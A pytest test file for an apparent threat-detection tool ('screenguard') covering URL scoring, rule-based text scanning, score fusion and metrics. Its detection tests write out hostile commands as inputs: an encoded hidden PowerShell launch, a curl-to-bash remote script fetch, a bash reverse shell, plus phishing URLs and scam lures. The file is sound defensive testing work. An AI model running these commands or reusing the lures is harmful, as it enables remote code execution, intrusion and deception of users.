import numpy as np
import pytest

from screenguard.analysis.decision import fuse_threat
from screenguard.analysis.rules import analyze_text, scan_text
from screenguard.analysis.url_features import analyze_url, extract_urls
from screenguard.metrics import binary_threat_report, classification_report, expected_calibration_error, roc_auc
from screenguard.taxonomy import THREAT_CLASSES


@pytest.mark.parametrize("url,bad", [
    ("https://accounts.google.com/signin", False),
    ("https://www.paypal.com/myaccount", False),
    ("https://github.com/pytorch/pytorch", False),
    ("http://paypa1-secure.xyz/login", True),
    ("https://paypal.com.verify-acc0unt.top/signin", True),
    ("http://192.0.2.10/login.php", True),
    ("https://xn--pple-43d.com/", True),
    ("https://micr0soft-support.live/update", True),
])
def test_url_scores(url, bad):
    r = analyze_url(url)
    assert (r.score > 0.5) == bad, (url, r.score, r.reasons)
    if bad:
        assert r.reasons


def test_extract_urls_skips_code_and_files():
    text = "see torch.nn and os.system; open report.pdf or train.py; visit paypa1-login.com/verify or https://bbc.com/news."
    urls = extract_urls(text)
    assert "paypa1-login.com/verify" in urls and "https://bbc.com/news" in urls
    assert not any(u.startswith(("torch.nn", "os.system", "report.pdf", "train.py")) for u in urls)


@pytest.mark.parametrize("text,category", [
    ("powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA", "suspicious_command"),
    ("curl -s http://203.0.113.9/install.sh | bash", "suspicious_command"),
    ("bash -i >& /dev/tcp/198.51.100.7/4444 0>&1", "suspicious_command"),
    ("Press Win + R then press CTRL + V to paste the verification code", "suspicious_command"),
    ("Here are the photos 📎 photo_2026.jpg.exe", "malware_download"),
    ("WARNING! Your computer is infected. Call Microsoft Support: +1-888-555-0101", "scam"),
    ("Send 0.5 BTC and receive 1 BTC back instantly!", "scam"),
    ("[DHL] Your parcel is on hold due to an unpaid customs fee", "phishing"),
])
def test_rules_detect(text, category):
    ev = analyze_text(text)
    assert ev.class_scores.get(category, 0) > 0.4, (text, ev.class_scores)
    assert ev.reasons()


def test_benign_text_has_no_strong_evidence():
    benign = ("git status\nOn branch main\nnothing to commit\npip install numpy torch\n"
              "Meeting moved to 3pm. Notes: https://docs.python.org/3/library/re.html")
    ev = analyze_text(benign)
    assert max(ev.class_scores.values(), default=0) < 0.3
    assert scan_text("") == []


def test_fuse_threat_modes():
    p = np.array([0.7, 0.1, 0.1, 0.05, 0.05])
    ev = {"suspicious_command": 0.9}
    m = fuse_threat(p, ev, THREAT_CLASSES, "model")
    assert np.allclose(m, p / p.sum())
    h = fuse_threat(p, ev, THREAT_CLASSES, "hybrid")
    assert np.isclose(h.sum(), 1) and THREAT_CLASSES[int(h.argmax())] == "suspicious_command"
    r = fuse_threat(p, {}, THREAT_CLASSES, "rules")
    assert r.argmax() == 0
    batch = fuse_threat(np.stack([p, p]), ev, THREAT_CLASSES, "hybrid")
    assert batch.shape == (2, 5) and np.allclose(batch[0], h)


def test_metrics():
    y = np.array([0, 0, 1, 1])
    assert roc_auc(y, np.array([0.1, 0.4, 0.35, 0.8])) == pytest.approx(0.75)
    assert roc_auc(y, np.array([0.1, 0.2, 0.8, 0.9])) == 1.0
    probs = np.array([[0.9, 0.1], [0.8, 0.2], [0.3, 0.7], [0.6, 0.4]])
    rep = classification_report(y, probs, ["a", "b"])
    assert rep["accuracy"] == 0.75 and rep["confusion"] == [[2, 0], [1, 1]]
    assert 0 <= expected_calibration_error(probs, y) <= 1
    b = binary_threat_report(np.array([0, 1, 2, 0]), np.array([[0.9, 0.05, 0.05], [0.2, 0.7, 0.1], [0.4, 0.1, 0.5], [0.3, 0.6, 0.1]]))
    assert b["recall"] == 1.0 and b["false_positive_rate"] == 0.5
